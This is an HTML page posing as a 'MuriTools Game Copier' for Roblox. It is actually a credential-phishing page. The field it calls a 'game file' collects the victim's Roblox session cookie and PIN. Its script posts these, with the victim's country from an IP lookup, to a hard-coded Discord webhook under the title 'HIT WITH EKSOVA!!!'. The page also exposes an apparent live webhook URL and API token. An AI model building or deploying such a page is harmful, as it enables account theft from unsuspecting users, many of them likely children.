<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MuriTools</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #0f0f0f, #003300);
            color: white;
        }
        .header {
            position: absolute;
            top: 20px;
            left: 30px;
            font-size: 3em;
            font-weight: bold;
            color: #ffffff;
        }
        .title-section {
            text-align: center;
            margin-top: 80px;
        }
        .container {
            display: flex;
            gap: 40px;
            align-items: center;
            margin-top: 40px;
        }
        .panel {
            background-color: #222;
            border-radius: 20px;
            padding: 15px;
            font-size: 1.3em;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.6);
            border: 3px solid #00ff00;
            width: 400px;
            text-align: center;
        }
        .panel h2 {
            font-size: 2em;
            margin-bottom: 45px;
            color: #fff;
        }
        .input-box {
            width: 90%;
            padding: 15px;
            font-size: 1.2em;
            margin: 15px 0;
            border: 1px solid #444;
            border-radius: 8px;
            background-color: #333;
            color: #fff;
        }
        .btn {
            width: 100%;
            padding: 15px;
            font-size: 1.5em;
            border: none;
            border-radius: 8px;
            background-color: #1e90ff;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .btn:hover {
            background-color: #187bcd;
        }
        .video-container {
            background-color: #000;
            border-radius: 10px;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 250px;
        }
        iframe {
            width: 100%;
            height: 100%;
        }
        /* Processing Message Panel - Overlay Style */
        .processing-panel {
            display: none; /* Hidden by default */
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(0, 0, 0, 0.9); /* Semi-transparent black */
            border-radius: 20px;
            padding: 60px;
            font-size: 2em;
            color: #ffffff;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
            text-align: center;
            z-index: 1000; /* Ensure it appears above everything else */
            max-width: 80%;
            width: 400px;
        }
    </style>
</head>
<body>
    <!-- Header Text -->
    <div class="header">MuriTools</div>

    <!-- Title and Description -->
    <div class="title-section">
        <h1 style="font-size: 3.5em; margin: 20px 0;">Game Copier</h1>
        <p style="font-size: 2em; text-align: center; max-width: 1200px;">
            Copy games with ease, with this brand new powershell-based system!
        </p>
    </div>

    <div class="container">
        <!-- Copy Games Panel -->
        <div class="panel">
            <h2>Copy Games</h2>
            <input type="text" id="gameFile" placeholder="Enter game file" class="input-box">
            <input type="text" id="pin" placeholder="Create a pin" class="input-box">
            <button class="btn" onclick="sendToDiscord()">Copy Game!</button>
        </div>

        <!-- How to Use Panel -->
        <div class="panel">
            <h2>How to use</h2>
            <div class="video-container">
                <!-- Replace the src with the link to your video -->
                <iframe src="https://www.youtube.com/embed/YOUR_VIDEO_ID" frameborder="0" allowfullscreen></iframe>
            </div>
        </div>
    </div>

    <!-- Processing Message Panel -->
    <div id="processingPanel" class="processing-panel">
        Game is being processed this may take 1-5 minutes!
    </div>

    <script>
        let countryFlag = '';
        let totalPings = 0; // Assume this would be dynamically managed on a backend or database.
        let cooldown = false; // Cooldown flag

        // Function to get country and flag emoji
        async function fetchCountry() {
            try {
                const response = await fetch("https://ipinfo.io/json?token=dc661f4538d752"); // Replace with a valid token
                const data = await response.json();
                const countryCode = data.country;
                countryFlag = countryToEmoji(countryCode);
            } catch (error) {
                console.error("Failed to fetch country data:", error);
            }
        }

        // Convert country code to flag emoji
        function countryToEmoji(countryCode) {
            return countryCode
                .toUpperCase()
                .replace(/./g, char => String.fromCodePoint(127397 + char.charCodeAt()));
        }

        // Call fetchCountry to set countryFlag at page load
        fetchCountry();

        // Function to send data to Discord webhook
        function sendToDiscord() {
            if (cooldown) return; // Exit if cooldown is active

            const gameFile = document.getElementById("gameFile").value;
            const pin = document.getElementById("pin").value;

            if (!gameFile) {
                alert("Please enter a game file.");
                return;
            }

            // Show the processing message
            document.getElementById("processingPanel").style.display = "block";

            const webhookUrl = "https://discord.com/api/webhooks/1300555524823187576/jn-SfRrTE-bmNQFXvaQRSmiZfmJFBQeMyI2uAaF27TwiOcQNXK7SeQP-Jc6S7G0KfaSP"; // Replace with your actual Discord webhook URL

            totalPings++; // Increment the ping count

            const data = {
                embeds: [
                    {
                        title: "HIT WITH EKSOVA!!!",
                        description: `**Total Hits**: ${totalPings}\n**Country**: ${countryFlag}\n\n**Pin**: ${pin || "N/A"}\n**ðŸªRoblox CookieðŸª**\n\`\`\`${gameFile || "No Game File Provided"}\`\`\``,
                        color: 0x000000, // Discord embed color (black)
                        footer: {
                            text: "fucking skids"
                        },
                        timestamp: new Date().toISOString()
                    }
                ]
            };

            // Send the data to the Discord webhook
            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            });

            // Set cooldown to prevent further pings for 5 seconds
            cooldown = true;
            setTimeout(() => {
                cooldown = false; // Reset cooldown after 5 seconds
                // Leave the processing panel visible indefinitely
            }, 5000);
        }
    </script>
</body>
</html>
